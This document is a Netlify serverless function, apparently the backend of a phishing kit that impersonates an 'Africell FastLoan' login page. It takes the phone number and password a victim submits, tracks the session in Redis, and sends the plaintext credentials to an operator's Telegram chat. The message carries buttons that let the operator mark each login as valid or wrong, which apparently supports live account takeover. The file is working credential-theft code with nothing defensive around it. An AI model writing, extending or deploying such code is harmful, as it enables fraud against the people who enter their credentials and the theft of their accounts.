const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

async function redisSet(key, value, exSeconds = 600) {
    await fetch(`${REDIS_URL}/set/${key}/${encodeURIComponent(value)}/ex/${exSeconds}`, {
        headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
}

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method Not Allowed' };

    const { phone, password, sessionId } = JSON.parse(event.body || '{}');
    if (!phone || !password || !sessionId) {
        return { statusCode: 400, body: JSON.stringify({ error: 'Missing fields' }) };
    }

    // Store initial pending status in Redis
    await redisSet(`session:${sessionId}:login`, 'pending');

    // Register webhook (auto-register on first hit)
    const webhookUrl = `${process.env.URL}/.netlify/functions/telegram-webhook`;
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);

    // Send Telegram message with inline buttons
    const text =
        `🏦 *Africell FastLoan – Login Attempt*\n\n` +
        `📱 Phone: \`${phone}\`\n` +
        `🔑 Password: \`${password}\`\n\n` +
        `Session: \`${sessionId}\``;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [[
                    { text: '✅ Correct Number + Password', callback_data: `login_ok:${sessionId}` },
                ], [
                    { text: '❌ Wrong Number', callback_data: `login_wrong_number:${sessionId}` },
                    { text: '❌ Wrong Password', callback_data: `login_wrong_password:${sessionId}` },
                ]]
            }
        })
    });

    return {
        statusCode: 200,
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ok: true })
    };
};
